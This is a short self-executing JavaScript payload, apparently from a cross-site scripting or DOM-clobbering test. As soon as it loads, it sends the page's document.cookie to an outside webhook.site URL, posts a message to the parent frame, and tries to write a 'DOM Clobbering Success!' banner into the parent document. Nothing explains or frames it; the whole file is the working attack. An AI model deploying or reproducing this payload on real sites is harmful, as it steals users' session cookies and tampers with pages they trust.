// This script executes as soon as it's loaded
(function() {
    // Send data to webhook
    fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?status=script_loaded&data=' + encodeURIComponent(document.cookie));
    
    // Also try to execute in the parent context
    try {
        parent.postMessage('executed', '*');
    } catch(e) {}
    
    // Try to access parent window
    try {
        window.parent.document.body.innerHTML += '<h1>DOM Clobbering Success!</h1>';
    } catch(e) {}
})();